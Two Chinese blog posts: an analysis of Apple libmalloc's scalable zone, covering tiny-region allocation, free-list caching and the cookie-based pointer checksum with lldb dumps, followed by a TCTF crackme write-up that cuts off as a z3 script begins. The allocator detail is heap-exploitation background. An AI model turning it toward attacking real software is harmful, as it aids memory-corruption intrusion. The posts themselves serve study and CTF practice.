MADV_REUSABLE) death-row arrivals above this threshold [~0.1%] szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10); /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */ int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;); if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) { szone-&gt;large_legacy_reset_mprotect = TRUE; } else { szone-&gt;large_legacy_reset_mprotect = FALSE; } #endif // Initialize the security token. szone-&gt;cookie = (uintptr_t)malloc_entropy[0]; szone-&gt;basic_zone.version = 10; szone-&gt;basic_zone.size = (void *)szone_size; szone-&gt;basic_zone.malloc = (void *)szone_malloc; szone-&gt;basic_zone.calloc = (void *)szone_calloc; szone-&gt;basic_zone.valloc = (void *)szone_valloc; szone-&gt;basic_zone.free = (void *)szone_free; szone-&gt;basic_zone.realloc = (void *)szone_realloc; szone-&gt;basic_zone.destroy = (void *)szone_destroy; szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc; szone-&gt;basic_zone.batch_free = (void *)szone_batch_free; szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect; szone-&gt;basic_zone.memalign = (void *)szone_memalign; szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size; szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief; szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address; /* Set to zero once and for all as required by CFAllocator. */ szone-&gt;basic_zone.reserved1 = 0; /* Set to zero once and for all as required by CFAllocator. */ szone-&gt;basic_zone.reserved2 = 0; /* Prevent overwriting the function pointers in basic_zone. */ mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ); szone-&gt;debug_flags = debug_flags; _malloc_lock_init(&amp;szone-&gt;large_szone_lock); szone-&gt;cpu_id_key = -1UL; // Unused. CHECK(szone, __PRETTY_FUNCTION__); return szone; } 这个函数分配并且初始化了szone，设置了szone_malloc、szone_free等函数 所以后面在调用malloc和free的时候实际上调用的是szone_malloc、szone_free。szone_malloc的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的malloc_zone_*进行实际的内存分配工作。 下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致 * frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482 frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18 frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77 frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103 frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24 frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109 frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37 frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396 frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197 frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68 .... scalable zoneszone包含两个racks，分别是tiny和small rack rack 32位机器 64位机器 tiny &lt;= 496B &lt;= 1008B small &lt;= 128KB &lt;=128KB 大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。 有几个处理器，rack就有几个magazine 每个magazine有多个regions，tiny(1MB)、small(8MB) 每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region) 具体可以从后面结构体中看出来其包含关系。 malloc-&gt;szone_malloc-&gt;szone_malloc_should_clearMALLOC_NOINLINE void * szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested) { void *ptr; msize_t msize; if (size &lt;= SMALL_THRESHOLD) { // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit) // think tiny msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1); if (!msize) { msize = 1; } ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested); } else if (size &lt;= szone-&gt;large_threshold) { // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS) // think small msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1); if (!msize) { msize = 1; } ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested); } else { // large: all other allocations size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift; if (num_kernel_pages == 0) { /* Overflowed */ ptr = 0; } else { ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested); } } return ptr; } 上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例 tiny_malloc_should_clearvoid * tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested) { void *ptr; mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines; magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested); #if DEBUG_MALLOC if (DEPOT_MAGAZINE_INDEX == mag_index) { malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\\n&quot;); return (NULL); } if (!msize) { malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\\n&quot;); return (NULL); } #endif SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); #if CONFIG_TINY_CACHE ptr = tiny_mag_ptr-&gt;mag_last_free; if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) { // we have a winner tiny_mag_ptr-&gt;mag_last_free = NULL; tiny_mag_ptr-&gt;mag_last_free_msize = 0; tiny_mag_ptr-&gt;mag_last_free_rgn = NULL; SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } #if DEBUG_MALLOC if (LOG(szone, ptr)) { malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\\n&quot;, ptr, msize); } #endif return ptr; } #endif /* CONFIG_TINY_CACHE */ while (1) { ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize); if (ptr) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } return ptr; } if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) { ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize); if (ptr) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); if (cleared_requested) { memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize)); } return ptr; } } // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc(). // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section. // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation, // and retry-ing threads succeed in the code just above. if (!tiny_mag_ptr-&gt;alloc_underway) { void *fresh_region; // time to create a new region (do this outside the magazine lock) tiny_mag_ptr-&gt;alloc_underway = TRUE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); // DTrace USDT Probe MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE); if (!fresh_region) { // out of memory! tiny_mag_ptr-&gt;alloc_underway = FALSE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); return NULL; } ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region); // we don&#39;t clear because this freshly allocated space is pristine tiny_mag_ptr-&gt;alloc_underway = FALSE; OSMemoryBarrier(); SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); return ptr; } else { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); yield(); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); } } /* NOTREACHED */ } 这里的if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。 free-&gt;malloc_zone_free-&gt;szone_freevoid szone_free(szone_t *szone, void *ptr) { region_t tiny_region; region_t small_region; #if DEBUG_MALLOC if (LOG(szone, ptr)) { malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\\n&quot;, ptr); } #endif if (!ptr) { return; } /* * Try to free to a tiny region. */ if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\\n&quot;, ptr); return; } if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) { if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\\n&quot;, ptr); return; } free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0); return; } /* * Try to free to a small region. */ if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\\n&quot;, ptr); return; } if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) { if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\\n&quot;, ptr); return; } free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0); return; } /* check that it&#39;s a legal large allocation */ if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) { malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\\n&quot;, ptr); return; } free_large(szone, ptr); } 同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例 void free_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size) { msize_t msize; boolean_t is_free; mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region); magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size); // ptr is known to be in tiny_region if (known_size) { msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1); } else { msize = get_tiny_meta_header(ptr, &amp;is_free); if (is_free) { free_tiny_botch(rack, ptr); return; } } #if DEBUG_MALLOC if (!msize) { malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\\n&quot;, ptr); return; } #endif SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); #if CONFIG_TINY_CACHE // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d if (DEPOT_MAGAZINE_INDEX != mag_index) { if (msize &lt; TINY_QUANTUM) { // to see if the bits fit in the last 4 bits void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize; region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn; /* check that we don&#39;t already have this pointer in the cache */ if (ptr == ptr2) { free_tiny_botch(rack, ptr); return; } if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) { memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize)); } tiny_mag_ptr-&gt;mag_last_free = ptr; tiny_mag_ptr-&gt;mag_last_free_msize = msize; tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region; if (!ptr2) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); CHECK(szone, __PRETTY_FUNCTION__); return; } msize = msize2; ptr = ptr2; tiny_region = rgn2; } } #endif /* CONFIG_TINY_CACHE */ // Now in the time it took to acquire the lock, the region may have migrated // from one magazine to another. I.e. trailer-&gt;mag_index is volatile. // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock) // is stale. If so, keep on tryin&#39; ... region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region); mag_index_t refreshed_index; while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); mag_index = refreshed_index; tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]); SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr); } if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) { SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr); } CHECK(szone, __PRETTY_FUNCTION__); } free的时候先将该内存缓存到mag_last_free，若之前mag_last_free为NULL，那么该内存暂时不会被free，仅仅是缓存到mag_last_free。反之，则会将mag_last_free之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点 最近free的内存会被缓存，不会立即合并 在被free的块metadata是被保护的 前后指针按16字节大小对齐 指针前4位为checksum 关于free块checksum计算如下： static MALLOC_INLINE uintptr_t free_list_checksum_ptr(rack_t *rack, void *ptr) { uintptr_t p = (uintptr_t)ptr; return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction } 指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。 实验代码如下 #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { void *p1,*p2,*p3,*p4; p1 = malloc(24); p2 = malloc(24); p3 = malloc(24); p4 = malloc(24); memset(p1,0xaa,24); memset(p2,0xbb,24); memset(p3,0xcc,24); free(p1); free(p3); free(p2); free(p4); } free(p1)，直接将p1缓存，所以内存值不变 (lldb) x/24gx p1 0x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa 0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0xcccccccccccccccc 0xcccccccccccccccc 0x100200240: 0xcccccccccccccccc 0x0000000000000000 free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节 (lldb) x/24gx p1 0x1002001f0: 0x0000000000000000 0x1000000010020108 0x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0xcccccccccccccccc 0xcccccccccccccccc 0x100200240: 0xcccccccccccccccc 0x0000000000000000 free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1 (lldb) x/24gx p1 0x1002001f0: 0x3000000010020023 0x1000000010020108 0x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0x0000000000000000 0x200000001002001f 0x100200240: 0xcccccccccccc0002 0x0002000000000000 0x100200250: 0x0000000000000000 0x0000000000000000 0x100200260: 0x0000000000000029 0x0000000000000000 free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block (lldb) x/24gx p1 0x1002001f0: 0x0000000000000000 0x5000000010020048 0x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c 0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb 0x100200220: 0xbbbbbbbbbbbbbbbb 0x0000000000000000 0x100200230: 0x0000000000000000 0x1000000010020108 0x100200240: 0xcccccccccccc0002 0x0006000000000000 0x100200250: 0x0000000000000000 0x0000000000000000 0x100200260: 0x0000000000000029 0x0000000000000000 上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。 libmalloc中一些结构体szone_s // magazine_zone.htypedef struct szone_s { // vm_allocate()&#39;d, so page-aligned to begin with. malloc_zone_t basic_zone; // first page will be given read-only protection uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)]; unsigned long cpu_id_key; // unused // remainder of structure is R/W (contains no function pointers) unsigned debug_flags; void *log_address; /* Allocation racks per allocator type. */ struct rack_s tiny_rack; struct rack_s small_rack; /* large objects: all the rest */ _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large unsigned num_large_objects_in_use; unsigned num_large_entries; large_entry_t *large_entries; // hashed by location; null entries don&#39;t count size_t num_bytes_in_large_objects; #if CONFIG_LARGE_CACHE int large_entry_cache_oldest; int large_entry_cache_newest; large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free boolean_t large_legacy_reset_mprotect; size_t large_entry_cache_reserve_bytes; size_t large_entry_cache_reserve_limit; size_t large_entry_cache_bytes; // total size of death row, bytes #endif /* flag and limits pertaining to altered malloc behavior for systems with * large amounts of physical memory */ unsigned is_largemem; unsigned large_threshold; unsigned vm_copy_threshold; /* security cookie */ uintptr_t cookie; /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */ struct szone_s *helper_zone; boolean_t flotsam_enabled; } szone_t; malloc_zone_t // malloc.htypedef struct _malloc_zone_t { /* Only zone implementors should depend on the layout of this structure; Regular callers should use the access functions below */ void *reserved1; /* RESERVED FOR CFAllocator DO NOT USE */ void *reserved2; /* RESERVED FOR CFAllocator DO NOT USE */ size_t (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */ void *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size); void *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */ void *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */ void (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr); void *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size); void (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g const char *zone_name; /* Optional batch callbacks; these may be NULL */ unsigned (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */ void (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */ struct malloc_introspection_t * MALLOC_INTROSPECT_TBL_PTR(introspect); unsigned version; /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */ void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size); /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/ void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size); /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */ size_t (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal); /* * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10. * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has * not yet been allocated. False negatives are not allowed. */ boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr); } malloc_zone_t; rack_t // magazine_rack.htypedef struct rack_s { /* Regions for tiny objects */ _malloc_lock_s region_lock MALLOC_CACHE_ALIGN; rack_type_t type; size_t num_regions; size_t num_regions_dealloc; region_hash_generation_t *region_generation; region_hash_generation_t rg[2]; region_t initial_regions[INITIAL_NUM_REGIONS]; int num_magazines; unsigned num_magazines_mask; int num_magazines_mask_shift; uint32_t debug_flags; // array of per-processor magazines magazine_t *magazines; uintptr_t cookie; uintptr_t last_madvise; } rack_t; magazine_t // magazine_zone.htypedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with. // Take magazine_lock first, Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN; // Protection for the crtical section that does allocate_pages outside the magazine_lock volatile boolean_t alloc_underway; // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size. void *mag_last_free; msize_t mag_last_free_msize; // msize for mag_last_free #if MALLOC_TARGET_64BIT uint32_t _pad; #endif region_t mag_last_free_rgn; // holds the region for mag_last_free free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS]; uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS]; // the first and last free region in the last block are treated as big blocks in use that are not accounted for size_t mag_bytes_free_at_end; size_t mag_bytes_free_at_start; region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0 // bean counting ... size_t mag_num_bytes_in_objects; size_t num_bytes_in_magazine; unsigned mag_num_objects; // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria. // Doubly linked list for efficient extraction. unsigned recirculation_entries; region_trailer_t *firstNode; region_trailer_t *lastNode; #if MALLOC_TARGET_64BIT uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS - (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2]; #else uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS - MAGAZINE_FREELIST_BITMAP_WORDS]; #endif } magazine_t; tiny_region_t //magazine_zone.h/* * Layout of a tiny region */ typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t)) typedef struct tiny_header_inuse_pair { uint32_t header; uint32_t inuse; } tiny_header_inuse_pair_t; typedef struct region_trailer { struct region_trailer *prev; struct region_trailer *next; boolean_t recirc_suitable; volatile int pinned_to_depot; unsigned bytes_used; mag_index_t mag_index; } region_trailer_t; #define NUM_TINY_BLOCKS 64520 typedef struct tiny_region { tiny_block_t blocks[NUM_TINY_BLOCKS]; region_trailer_t trailer; // The interleaved bit arrays comprising the header and inuse bitfields. // The unused bits of each component in the last pair will be initialized to sentinel values. tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS]; uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE]; } * tiny_region_t; 参考 http://phrack.org/issues/63/5.html https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html &lt;&lt;the Mac Hacker’s Handbook&gt;&gt; 第8章Exploiting Heap Overflows https://opensource.apple.com/source/libmalloc/ 源代码 http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf","tags":[{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"}]},{"title":"TCTF-Elements","date":"2019-03-27T07:13:30.000Z","path":"2019/03/27/TCTF-Elements/TCTF-Elements/","text":"TCTF-Elements 这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。 Elements下面是main函数伪代码 signed __int64 __fastcall main(__int64 a1, char **a2, char **a3) { char v3; // bl const __int32_t **v4; // rax char *v5; // rcx size_t v6; // rcx signed __int64 result; // rax char *v8; // r12 signed __int64 v9; // r14 char v10; // bl signed __int64 v11; // rax const unsigned __int16 *v12; // rcx signed __int64 v13; // rdx __int64 v14; // rsi unsigned __int16 v15; // bx signed __int64 v16; // rsi __m128i v17; // xmm0 char *v18; // rax double v19; // xmm2_8 double v20; // xmm0_8 double v21; // xmm2_8 double v22; // xmm3_8 double v23; // [rsp+20h] [rbp-148h] double v24; // [rsp+28h] [rbp-140h] double v25; // [rsp+30h] [rbp-138h] char s[8]; // [rsp+40h] [rbp-128h] char v27; // [rsp+6Bh] [rbp-FDh] fgets(s, 256, stdin); v3 = s[0]; if ( s[0] ) { v4 = __ctype_tolower_loc(); v5 = &amp;s[1]; do { *(v5 - 1) = (*v4)[v3]; v3 = *v5++; } while ( v3 ); } v6 = strlen(s); result = 0LL; if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 ) { v27 = 0; v8 = strtok(&amp;s[5], &quot;-&quot;); v9 = 0LL; if ( v8 ) { while ( strlen(v8) == 12 ) { v10 = *v8; v11 = 0LL; if ( *v8 ) { v12 = *__ctype_b_loc(); v13 = 1LL; v11 = 0LL; do { v14 = v10; v15 = v12[v10]; if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 ) { v16 = v14 - 87; } else { if ( !(v15 &amp; 0x800) ) goto LABEL_31; v16 = v14 - 48; } v11 = v16 | 16 * v11; if ( v13 &gt; 11 ) break; v10 = v8[v13++]; } while ( v10 ); } if ( !v9 &amp;&amp; v11 != 62791383142154LL ) break; v17 = (__m128i)_mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0), (__m128d)xmmword_400BE0); *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64; v18 = strtok(0LL, &quot;-&quot;); v8 = v18; if ( v9 &gt; 2 || !v18 ) { if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 ) break; v19 = v24 * v24 + v23 * v23 - v25 * v25; v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25; v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13; if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 ) { v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13; if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 ) puts(&quot;Congratz, input is your flag&quot;); } return 0LL; } } } LABEL_31: result = 0xFFFFFFFFLL; } return result; } 这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。 分析可得到需要输入以下格式flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx} 这里通过-分割成三个部分，其中第一部分是已知的391bc2164f0a，后面就是程序验证逻辑 if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 ) break; v19 = v24 * v24 + v23 * v23 - v25 * v25; v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25; v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13; if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 ) { v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13; if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 ) puts(&quot;Congratz, input is your flag&quot;); } 当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式 $c&gt;b,b&gt;a,a+b&gt;c$ $p=\\frac{\\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$ $q=\\frac{abc}{(\\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$ $-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $ 但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3 from z3 import * x = 